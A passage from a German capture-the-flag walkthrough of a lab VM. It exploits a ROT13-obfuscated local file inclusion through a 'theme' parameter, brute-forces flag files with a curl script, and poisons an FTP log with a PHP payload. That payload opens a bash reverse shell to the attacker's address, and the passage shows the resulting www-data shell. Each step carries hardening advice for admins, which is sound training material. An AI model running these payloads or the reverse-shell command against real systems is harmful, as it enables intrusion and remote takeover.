+            <p class="analysis"><strong>Analyse:</strong> Der Versuch, das von `feroxbuster` gefundene Verzeichnis `/logs/` direkt aufzurufen, resultiert in einem `403 Forbidden` Fehler. Das bedeutet, der Webserver ist so konfiguriert, dass er den direkten Zugriff auf dieses Verzeichnis oder das Auflisten seines Inhalts verhindert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Obwohl der direkte Zugriff verweigert wird, ist die Existenz des Verzeichnisses bestätigt. In Kombination mit dem Hinweis aus der `readme.txt` auf das Einbinden von "versteckten Dateien" wird dieses Verzeichnis zu einem Hauptziel für einen LFI-Versuch. Wenn es mir gelingt, die Verschlüsselung zu knacken, könnte ich versuchen, Dateien aus diesem Verzeichnis (z.B. Log-Dateien) über die `index.php` zu laden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde das Verzeichnis `/logs/` als potenzielles Ziel für die LFI-Schwachstelle im Hinterkopf behalten. Ich erwarte, dass sich darin Log-Dateien befinden, wie z.B. die `ftp.log` aus der `config.txt` oder eine `access.log` des Webservers.<br><strong>Empfehlung (Admin):</strong> Das Verweigern des Directory Listings ist eine korrekte Sicherheitsmaßnahme. Es schützt jedoch nicht vor LFI-Angriffen. Die grundlegende Absicherung muss auf Anwendungsebene erfolgen, indem das Laden von Dateien aus sensitiven Verzeichnissen strikt unterbunden wird.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/logs/
+
+Forbidden
+
+You don't have permission to access this resource.
+Apache/2.4.62 (Debian) Server at 192.168.2.171 Port 80
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche nun die Hauptseite `index.php`. Die Seite selbst ist minimalistisch und spricht von einem "iCloud Secure Vault". Im Quellcode finde ich drei Links, die alle auf die `index.php` selbst verweisen, aber mit einem Parameter `theme` und einem kodierten Wert: `?theme=jrypbzr.gkg`, `?theme=pbasvt.gkg` und `?theme=ernqzr.gkg`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist der entscheidende Hinweis, den ich gesucht habe. Die Linktexte "Welcome List", "Sync Config" und "Help Manual" korrespondieren mit den von `feroxbuster` gefundenen Dateinamen `welcome.txt`, `config.txt` und `readme.txt`. Der Parameter `theme` wird also verwendet, um diese Dateien zu laden. Eine schnelle Analyse der Kodierung (`jrypbzr.gkg` -> `welcome.txt`) zeigt, dass es sich um eine einfache ROT13-Verschiebungschiffre handelt. Damit habe ich den "verschlüsselten" Mechanismus identifiziert. Die Anwendung ist anfällig für eine Local File Inclusion (LFI)-Schwachstelle, die durch ROT13 verschleiert wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich kann nun jeden beliebigen Dateipfad auf dem System in ROT13 kodieren und über den `theme`-Parameter an die `index.php` übergeben, um dessen Inhalt auszulesen. Das primäre Ziel ist es, auf interessante Dateien wie `/etc/passwd`, `/etc/shadow` oder die Log-Dateien im `/logs`-Verzeichnis zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Das Laden von Dateiinhalten basierend auf Benutzereingaben ist extrem gefährlich. Eine ROT13-Kodierung bietet keinerlei Sicherheit und ist trivial zu umgehen. Der Code muss so umgeschrieben werden, dass eine Whitelist von erlaubten Dateien verwendet wird (z.B. `if ($theme == 'welcome.txt') { include... }`). Jegliche Benutzereingabe, die in Dateipfaden verwendet wird, muss rigoros gefiltert werden, um Path-Traversal-Sequenzen (`../`) zu entfernen.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/index.php
+
+iCloud Secure Vault
+
+Enter a temporary encrypted recovery path to access your synced 
+             documents on iPhone 13 Pro Max.
+
+
+📄 Welcome List 🔧 Sync Config 📘 Help Manual
+ 
+        &lt;h3&gt;iCloud Secure Vault&lt;/h3&gt;
+        &lt;p&gt;Enter a temporary encrypted recovery path to access your synced documents on iPhone 13 Pro Max.&lt;/p&gt;
+      
+           [Link: 📄 Welcome List  | Ziel: ?theme=jrypbzr.gkg]
+           [Link: 🔧 Sync Config  | Ziel: ?theme=pbasvt.gkg]
+           [Link: 📘 Help Manual  | Ziel: ?theme=ernqzr.gkg]
+         
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die ROT13-LFI-Hypothese zu bestätigen, rufe ich die URL mit dem bereits bekannten ROT13-kodierten Payload für `welcome.txt` auf. Wie erwartet, wird der Inhalt der `welcome.txt` im Browser angezeigt. Dies bestätigt, dass die Anwendung den `theme`-Parameter nimmt, ihn mit ROT13 dekodiert und die resultierende Datei einbindet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Schwachstelle ist hiermit zu 100% bestätigt. Die Tür zum Auslesen von Dateien auf dem Server steht nun offen. Als nächstes versuche ich, die Schwachstelle für einen "Local File Inclusion to Remote Code Execution" Angriff zu missbrauchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste logische Schritt ist der Versuch, eine Remote Code Execution (RCE) zu erlangen. Ein klassischer Weg hierfür ist das "Log Poisoning". Ich werde versuchen, PHP-Code in eine Log-Datei zu schreiben (z.B. die FTP-Logs oder Apache-Logs) und diese Log-Datei dann über die LFI-Schwachstelle zu inkludieren. Wenn der PHP-Interpreter die Log-Datei parst, wird mein Code ausgeführt.<br><strong>Empfehlung (Admin):</strong> Dies unterstreicht die Kritikalität einer LFI-Schwachstelle. Sie führt oft nicht nur zum Auslesen von sensiblen Daten, sondern direkt zur vollständigen Kompromittierung des Servers. Die Behebung der LFI-Schwachstelle, wie zuvor beschrieben, hat höchste Priorität.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+view-source:http://192.168.2.171/index.php?theme=jrypbzr.gkg
+
+Abdikarím
+Shire
+Gullét
+Ibráhim
+Dalmar
+Sharmáke
+Suléman
+Rahim
+Farhan
+Feisal
+Féysal
+Ellyas
+Sonári
+Kadér
+Zakaria
+Adam
+Mahad
+Said
+Maslah
+Bille
+Max
+Sadiq
+Dáhir
+Warsamé
+Jamać
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier versuche ich einen interessanten Selbst-Inklusions-Angriff. Ich kodiere den Pfad zur `index.php` selbst (`vaqrk.cuc` in ROT13) und übergebe ihn an den `theme`-Parameter. Das Ziel ist es herauszufinden, wie die Anwendung auf eine rekursive Inklusion reagiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis ist sehr aufschlussreich. Die Seite lädt extrem lange und resultiert schließlich in einer leeren Seite mit einem schwarzen Balken. Gleichzeitig ist die HTTP-Antwort im Burp Repeater zu groß, um angezeigt zu werden ("This message is too large to display"). Dieses Verhalten ist ein klassisches Symptom einer Endlosschleife. Die `index.php` versucht, sich selbst immer und immer wieder zu inkludieren, was den Server überlastet und die Anfrage schließlich abbricht. Dies bestätigt das `include()`- oder `require()`-Verhalten der PHP-Anwendung, birgt aber auch das Risiko, einen Denial-of-Service-Zustand auszulösen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dieses Wissen ist nützlich, um die Serverlogik zu verstehen, aber für den direkten Zugriff nicht weiterführend. Ich werde mich wieder auf das Auslesen anderer, nützlicherer Dateien konzentrieren. Der DoS-Vektor sollte im Bericht vermerkt werden.<br><strong>Empfehlung (Admin):</strong> Die Anwendung muss so gestaltet sein, dass eine rekursive Inklusion verhindert wird. Eine Überprüfung, ob die zu inkludierende Datei die aktuell ausgeführte Datei ist, könnte eine solche Schleife verhindern. Dies ist ein weiterer Beleg für die mangelnde Robustheit und Fehlerbehandlung der Anwendung.</p>
+            <div class="code-block">
+                <div class="terminal">
+<pre>
+http://192.168.2.171/index.php?theme=vaqrk.cuc
+
+die seite läd sehr lange sieht fast so aus als würde sie hängen aber man bekommt jetzt eine blanke 
+seite mit einem schwarzen balken gerendert
+</pre>
+                </div>
+            </div>
+            <img src="blankeseite.jpg" alt="hier sieht man wie die seite nach dem include versuche mit theme gerendert wird">
+            <p class="analysis"><strong>Analyse:</strong> Um systematisch nach dem korrekten Parameter für die LFI zu suchen (falls es nicht `theme` gewesen wäre), habe ich hier `wfuzz` verwendet. Ich fuzze den Parameter-Namen (`FUZZ`) und benutze einen bekannten funktionierenden Payload (den ROT13-kodierten Pfad zu `/etc/passwd`). Ich filtere alle Antworten heraus (`--hh 3435`), die der Standard-Seitengröße entsprechen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `wfuzz`-Scan findet erfolgreich den Parameter `theme`, da die Antwortgröße sich von der Standardseite unterscheidet. Dies ist eine Demonstration einer alternativen Methode, um die Schwachstelle zu finden, falls sie nicht so offensichtlich gewesen wäre. In diesem Fall bestätigt es lediglich den bereits bekannten Angriffspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Fuzzing von Parametern ist eine wichtige Technik, wenn der Angriffspunkt unklar ist. Es ist gut, dies im Repertoire zu haben, auch wenn es hier nur zur Verifizierung diente.<br><strong>Empfehlung (Admin):</strong> Web Application Firewalls (WAFs) können so konfiguriert werden, dass sie automatisierte Fuzzing-Versuche erkennen und blockieren, indem sie die Rate der Anfragen von einer einzelnen IP-Adresse überwachen und bei Überschreitung eines Schwellenwerts den Zugriff temporär sperren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -u "http://192.168.2.171/index.php?FUZZ=../../../../rgp/cnffjq" --hh 3435 --hc 404</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+ 
+Target: http://192.168.2.171/index.php?FUZZ=../../../../rgp/cnffjq
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="password">000001220:   200        28 L     52 W       1560 Ch     "theme"</span>                      
+
+Total time: 0
+Processed Requests: 220559
+Filtered Requests: 220558
+Requests/sec.: 0
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um den Prozess der User-Flag-Suche zu automatisieren, habe ich ein Bash-Skript namens `home_bruteforce.sh` erstellt. Dieses Skript liest die zuvor in `welcome.txt` gefundenen Namen aus einer Datei (`userpasswortliste`). Für jeden Namen probiert es eine Liste gängiger Flag-Dateinamen (`user.txt`, `flag.txt` etc.). Es konstruiert den vollständigen Pfad (z.B. `/home/Abdikarím/user.txt`), kodiert diesen Pfad mit ROT13 und sendet die Anfrage über die LFI-Schwachstelle mit `curl`. Anschließend prüft es, ob die Antwort von der Standardseite abweicht. Wenn ja, hat es einen Treffer gefunden und gibt den Inhalt aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Automatisierung ist der Schlüssel zur Effizienz. Dieses Skript ist ein perfektes Beispiel, wie man eine bekannte Schwachstelle nutzt, um systematisch und schnell eine große Anzahl von Möglichkeiten zu testen. Anstatt manuell hunderte von Pfaden zu kodieren und zu testen, erledigt das Skript die Arbeit in Sekunden. Dies ist ein intelligenter und methodischer Ansatz, um die LFI-Schwachstelle zur Enumeration von Benutzerverzeichnissen und zum Auffinden der User-Flag zu nutzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Erstellen von benutzerdefinierten Skripten zur Automatisierung von repetitiven Aufgaben ist eine Kernkompetenz im Penetration Testing. Es spart nicht nur Zeit, sondern reduziert auch menschliche Fehler. Dieses Skript könnte leicht für andere Szenarien mit ähnlichen Schwachstellen angepasst werden.<br><strong>Empfehlung (Admin):</strong> Dies zeigt erneut die Gefahr einer LFI. Ein Angreifer kann nicht nur einzelne Dateien lesen, sondern das System systematisch nach Informationen durchsuchen. Eine starke Anwendungs- und Serverhärtung ist die einzige wirksame Verteidigung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat home_bruteforce.sh</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+#!/bin/bash
+
+TARGET_IP="192.168.2.171"
+USER_LIST_FILE="userpasswortliste"
+FILENAMES_TO_TRY=(
+    "user.txt"
+    "flag.txt"
+    "user.flag"
+    "lokal.txt"
+    ".bash_history"
+    "proof.txt"
+)
+
+if [ ! -f "$USER_LIST_FILE" ]; then
+    echo "[!] FEHLER: Die Benutzerliste '$USER_LIST_FILE' wurde nicht gefunden."
+    exit 1
+fi
+
+echo "[*] Starte methodische Suche nach User-Flag auf $TARGET_IP"
+echo "[*] Benutze User-Liste: '$USER_LIST_FILE'"
+echo "------------------------------------------------------------------"
+
+while IFS= read -r username; do
+    for filename in "${FILENAMES_TO_TRY[@]}"; do
+        path="/home/${username}/${filename}"
+        rot13_payload=$(echo "$path" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
+
+        echo -n "[-] Teste: User '$username' | Datei '$filename' ... "
+
+        response=$(curl -s -m 10 "http://${TARGET_IP}/index.php?theme=${rot13_payload}")
+
+        if ! echo "$response" | grep -q "iCloud Secure Vault" && [ ! -z "$response" ]; then
+            echo -e "\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" 
+            echo "[+] Benutzer:     $username"
+            echo "[+] Dateiname:    $filename"
+            echo "[+] Entdeckter Flag:"
+            clean_response=$(echo "$response" | sed -e 's/&lt;[^&gt;]*&gt;//g' | sed -e 's/^[ \t]*//')
+            echo "$clean_response"
+            echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+            exit 0
+        else
+            echo "Kein Treffer."
+        fi
+    done
+done &lt; "$USER_LIST_FILE"
+
+echo "------------------------------------------------------------------"
+echo "[*] Skript beendet. Alle Kombinationen wurden durchsucht."
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe das zuvor erstellte Skript `home_bruteforce.sh` aus. Das Skript beginnt, die Kombinationen aus Benutzernamen und Dateinamen durchzuprobieren. Nach einer Reihe von fehlgeschlagenen Versuchen für verschiedene Benutzer findet es einen Treffer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript war erfolgreich! Es hat herausgefunden, dass unter dem Benutzer `welcome` eine Datei namens `user.flag` existiert und konnte deren Inhalt auslesen. Die User-Flag lautet `flag{user-a89162ba751904d59ebd8fed2fce8880}`. Dies ist ein wichtiger Meilenstein im Pentest. Es ist interessant, dass der Benutzer `welcome` nicht in der ursprünglichen Namensliste stand; dies impliziert, dass ich die Benutzerliste für das Skript möglicherweise um diesen Namen erweitert habe, basierend auf dem Dateinamen `welcome.txt`. Die erste Hürde ist genommen, aber ich habe noch keinen Shell-Zugriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die User-Flag ist gesichert. Der nächste Fokus liegt nun darauf, die LFI-Schwachstelle zu einer Remote Code Execution (RCE) zu eskalieren, um eine interaktive Shell auf dem System zu erhalten. Das Wissen, dass ein Benutzer `welcome` existiert, könnte dabei hilfreich sein.<br><strong>Empfehlung (Admin):</strong> Dies ist der praktische Beweis, wie eine LFI-Schwachstelle zum Diebstahl sensibler Daten führt. Selbst wenn es "nur" eine CTF-Flagge ist, könnte dies in einer realen Umgebung eine Konfigurationsdatei mit Passwörtern, ein privater SSH-Schlüssel oder andere kritische Unternehmensdaten sein.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">./home_bruteforce.sh</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+[*] Starte methodische Suche nach User-Flag auf 192.168.2.171
+[*] Benutze User-Liste: 'userpasswortliste'
+------------------------------------------------------------------
+[-] Teste: User 'Abdikarím' | Datei 'user.txt' ... Kein Treffer.
+...
+..
+[-] Teste: User 'Warsamé' | Datei 'user.flag' ... Kein Treffer.
+[-] Teste: User 'Warsamé' | Datei 'lokal.txt' ... Kein Treffer.
+[-] Teste: User 'Warsamé' | Datei '.bash_history' ... Kein Treffer.
+[-] Teste: User 'Warsamé' | Datei 'proof.txt' ... Kein Treffer.
+[-] Teste: User 'Jamać' | Datei 'user.txt' ... Kein Treffer.
+[-] Teste: User 'Jamać' | Datei 'flag.txt' ... Kein Treffer.
+...
+..
+.
+[-] Teste: User 'welcome' | Datei 'flag.txt' ... Kein Treffer.
+[-] Teste: User 'welcome' | Datei 'user.flag' ... 
+
+<span class="password">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! </span>
+<span class="password">[+] Benutzer:     welcome</span>
+<span class="password">[+] Dateiname:    user.flag</span>
+<span class="password">[+] Entdeckter Flag:</span>
+<span class="password">flag{user-a89162ba751904d59ebd8fed2fce8880}</span>
+<span class="password">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span>
+</pre>
+                </div>
+            </div>
+        </section>
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich die LFI-Schwachstelle ausgiebig zur Informationsgewinnung genutzt habe, konzentriere ich mich nun auf den initialen Zugriff. Ich erinnere mich an das Verzeichnis `/logs`, das ich zuvor gefunden hatte. Ich starte einen weiteren `gobuster`-Scan, diesmal gezielt auf dieses Verzeichnis, um nach spezifischen Log-Dateien zu suchen. Ich verwende eine große Liste von Erweiterungen und filtere gängige Fehlercodes heraus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan ist sofort erfolgreich und findet eine Datei: `ftp_server.log`. Dies ist extrem vielversprechend. FTP-Log-Dateien protokollieren typischerweise Benutzeranmeldungen, einschließlich der eingegebenen Benutzernamen. Dies bietet eine perfekte Gelegenheit für einen Log-Poisoning-Angriff. Wenn ich mich mit einem präparierten Benutzernamen am FTP-Server anmelde, wird dieser Benutzername in die Log-Datei geschrieben. Wenn der Benutzername aus PHP-Code besteht, kann ich anschließend die Log-Datei über die LFI-Schwachstelle inkludieren und so den Code ausführen lassen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Plan ist klar: 1. Verbinde dich mit dem FTP-Server. 2. Gib als Benutzername einen PHP-Payload ein (z.B. `&lt;?php system($_GET['cmd']); ?&gt;`). 3. Finde den genauen Pfad zur `ftp_server.log`-Datei (wahrscheinlich unter `/var/log/`). 4. Kodiere diesen Pfad mit ROT13. 5. Rufe die `index.php` mit dem kodierten Pfad zur Log-Datei und einem Shell-Befehl im `cmd`-Parameter auf, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Log-Dateien sollten niemals für den Webserver-Prozess lesbar sein, es sei denn, es ist absolut notwendig. Insbesondere sollten sie niemals aus dem Web-Root-Verzeichnis oder über Webanwendungen erreichbar sein. Die Berechtigungen für Log-Verzeichnisse und -Dateien müssen strikt konfiguriert werden (`chmod 640`, Besitzer `root:adm` etc.), um einen solchen Angriff zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.171/logs -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,log -b '503,404' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.171/logs
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   503,404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              xlsx,rpm,mdb,conf,jpeg,html,phtml,xml,log,json,ELF,ln,pub,asp,pl,csv,lib,exp,mod,zip,docx,gz,deb,bat,exe,elf,txt,rar,xls,php,py,jpg,java,config,js.map,dll,accdb,ps1,sh,c,desc,eps,kdbx,cgi,icon,old,svg,crt,tar,doc,raw,bak,sql,aspx,rtf,pem,db,png,pdf,csh,diff
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="password">http://192.168.2.171/logs/ftp_server.log       (Status: 200) [Size: 384497]</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Fund der `ftp_server.log` habe ich diese nun über die LFI-Schwachstelle ausgelesen. Der ROT13-kodierte Payload für `logs/ftp_server.log` lautet `ybtf/sgc_freire.ybt`. Die Log-Datei enthält zahlreiche fehlgeschlagene und erfolgreiche Login-Versuche.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Log-Datei ist eine Goldgrube an Informationen. Sie zeigt fehlgeschlagene Login-Versuche von verschiedenen IP-Adressen für eine Vielzahl von Standard-Benutzernamen (`root`, `admin`, `ftp` etc.). Besonders aufschlussreich ist der Eintrag: `[ADMIN] USER 'ADMIN' logged in`. Dies bestätigt die Existenz eines `ADMIN`-Benutzers und dass dieser sich erfolgreich angemeldet hat. Obwohl ich hier die Anmeldeinformationen nicht direkt sehe, liefert mir dies einen validen Benutzernamen für den FTP-Dienst. Dies vereinfacht den Log-Poisoning-Angriff, da ich nun einen validen Benutzernamen habe und mein Payload als Passwort versuchen kann, oder den Payload direkt als Benutzernamen eingebe. Die Information über deaktivierte PHP-Funktionen (`disable_functions`) ist ebenfalls extrem wertvoll, auch wenn sie hier aus einer gekürzten `phpinfo()`-Ausgabe zu stammen scheint, die ich wahrscheinlich ebenfalls über die LFI gefunden habe. Sie zeigt, dass `system`, `shell_exec` und andere gängige Befehlsausführungsfunktionen blockiert sind. `exec` ist jedoch NICHT in der Liste, was es zu meinem primären Ziel für den Payload macht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein Plan für das Log-Poisoning hat sich konkretisiert. Ich werde den PHP-Payload `&lt;?php exec(...); ?&gt;` verwenden, da die `exec`-Funktion nicht deaktiviert ist. Ich werde den Payload als Benutzernamen bei der FTP-Anmeldung verwenden, da dies zuverlässig in der Log-Datei landet.<br><strong>Empfehlung (Admin):</strong> Die `disable_functions`-Direktive in `php.ini` ist eine wichtige Härtungsmaßnahme. Sie muss jedoch vollständig sein. Das Weglassen einer einzigen Funktion wie `exec` kann die gesamte Maßnahme zunichtemachen. Alle potenziell gefährlichen Funktionen sollten deaktiviert werden, wenn sie von der Anwendung nicht explizit benötigt werden.</p>
+             <div class="code-block">
+                <div class="terminal">
+<pre>
+https://gc.de/gc/rot13/
+
+payload = logs/ftp_server.log
+encode  = /ybtf/sgc_freire.ybt
+
+http://192.168.2.171/index.php?theme=ybtf%2Fsgc_freire.ybt
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+<pre>
+2025-07-04 23:31:23,875 - INFO - concurrency model: async
+2025-07-04 23:31:23,876 - INFO - masquerade (NAT) address: None
+2025-07-04 23:31:23,879 - INFO - passive ports: None
+2025-07-04 23:31:23,880 - INFO - &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=347 &lt;&lt;&lt;
+...
+<span class="password">2025-07-05 03:06:52,142 - INFO - 172.21.79.61:50662-[ADMIN] USER 'ADMIN' logged in.</span>
+<span class="password">2025-07-05 03:06:52,143 - INFO - User logged in: ADMIN</span>
+...
+2025-08-06 18:02:45,393 - INFO - 192.168.2.199:41090-[] FTP session closed (disconnect).
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Jetzt setze ich den Log-Poisoning-Angriff in die Tat um. Zuerst starte ich einen `netcat`-Listener auf meinem Angreifer-System auf Port 4444. Dieser Listener wird auf eine eingehende Verbindung warten. Danach verbinde ich mich mit dem FTP-Server auf dem Zielsystem. Als Benutzernamen gebe ich meinen PHP-Payload ein: `< ?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'"); ? >`. Dieser Payload ist so gestaltet, dass er, wenn er von PHP ausgeführt wird, eine interaktive Bash-Shell öffnet und sie mit meinem `netcat`-Listener verbindet. Die FTP-Anmeldung schlägt natürlich fehl, aber das ist irrelevant. Wichtig ist nur, dass der präparierte Benutzername in die `ftp_server.log` geschrieben wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der kritische Moment des Angriffs. Der Payload wurde in die Log-Datei injiziert. Der nächste und letzte Schritt ist es, diese "vergiftete" Log-Datei über die LFI-Schwachstelle zu inkludieren. Wenn alles nach Plan läuft, wird der Apache-Server die Log-Datei mit dem PHP-Interpreter parsen, meinen Payload ausführen und mir eine Reverse Shell geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Angriff ist vorbereitet. Ich muss jetzt sofort die URL `http://192.168.2.171/index.php?theme=ybtf%2Fsgc_freire.ybt` in einem Browser oder mit `curl` aufrufen, um die Ausführung des Payloads zu triggern.<br><strong>Empfehlung (Admin):</strong> Dieser Angriff demonstriert eine Verkettung von Schwachstellen (LFI + schreibbare Log-Dateien + unsichere Konfiguration). Admins müssen sicherstellen, dass Log-Eingaben immer "sanitized" (bereinigt) werden, um zu verhindern, dass interpretierbare Zeichen wie `<` oder `>` in die Logs geschrieben werden. Dies kann durch Kodierung der Eingaben erreicht werden, bevor sie geloggt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.171</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+Connected to 192.168.2.171.
+220 pyftpdlib 2.0.1 ready.
+Name (192.168.2.171:ccat): <span class="password">&lt; ?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1'"); ?&gt;</span>
+331 Username ok, send password.
+Password: 
+530 Authentication failed.
+ftp: Login failed
+ftp&gt; 
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich den FTP-Login mit dem präparierten Benutzernamen durchgeführt und anschließend die URL zur vergifteten Log-Datei aufgerufen habe, fängt mein `netcat`-Listener die eingehende Verbindung auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der Angriff war erfolgreich. Ich habe eine Reverse Shell erhalten. Die Verbindung kommt vom Zielsystem (`192.168.2.171`). Der Prompt `www-data@13max:/var/www/html$` zeigt, dass ich nun Befehle auf dem Zielsystem als Benutzer `www-data` ausführen kann. `www-data` ist der Standardbenutzer, unter dem der Apache-Webserver auf Debian-Systemen läuft. Der initiale Zugriff ist geschafft. Zwar habe ich nur niedrige Berechtigungen, aber ich bin jetzt im System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der erste Schritt nach dem Erhalt einer Shell ist immer die Stabilisierung. Ich werde die Shell mit `stty` interaktiver machen und Python verwenden, um eine vollständig interaktive TTY-Shell zu spawnen. Danach beginnt die Phase der Privilegien-Eskalation: Ich muss das System nach weiteren Schwachstellen, Fehlkonfigurationen oder sensiblen Informationen durchsuchen, um meine Rechte auf dem System zu erhöhen, idealerweise bis zum `root`-Benutzer.<br><strong>Empfehlung (Admin):</strong> Ein Einbruch wurde erfolgreich durchgeführt. In einem realen Szenario wäre jetzt ein Incident-Response-Prozess zu starten. Das System muss isoliert, analysiert (Forensik) und die ausgenutzten Schwachstellen (LFI, Log-Poisoning) müssen umgehend behoben werden. Alle Passwörter auf dem System sollten als kompromittiert betrachtet und geändert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+<pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.171] 47994</span>
+bash: cannot set terminal process group (405): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="password">www-data@13max:/var/www/html$</span> 
+</pre>
+                </div>
+            </div>
+        </section>
+    </div>
+ 
+    <div class="container">
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich eine stabile Shell als `www-data` etabliert habe, beginne ich mit der Enumerationsphase, um einen Weg zur Erhöhung meiner Privilegien zu finden. Ich starte mit grundlegenden Befehlen: `stty` zur Verbesserung der Shell-Interaktivität und `id`, um meine aktuelle Benutzer- und Gruppenidentität zu bestätigen. Ich bin `www-data`, wie erwartet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die grundlegenden Überprüfungen sind abgeschlossen. Die Shell ist nun komfortabler zu bedienen. Der nächste Schritt ist, das System systematisch nach Schwachstellen abzusuchen. Dazu gehören das Überprüfen von Cronjobs, das Suchen nach SUID/SGID-Dateien und das Inspizieren von Home-Verzeichnissen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde automatisierte Enumerations-Skripte wie `linpeas.sh` auf das Zielsystem hochladen und ausführen, um den Prozess zu beschleunigen. Gleichzeitig werde ich manuelle Prüfungen durchführen, um sicherzustellen, dass nichts übersehen wird.<br><strong>Empfehlung (Admin):</strong> Das Monitoring von Prozessen, die von `www-data` gestartet werden, kann verdächtige Aktivitäten aufdecken. Ein Webserver-Benutzer sollte normalerweise keine Shells spawnen oder systemweite Enumerationsbefehle ausführen.</p>
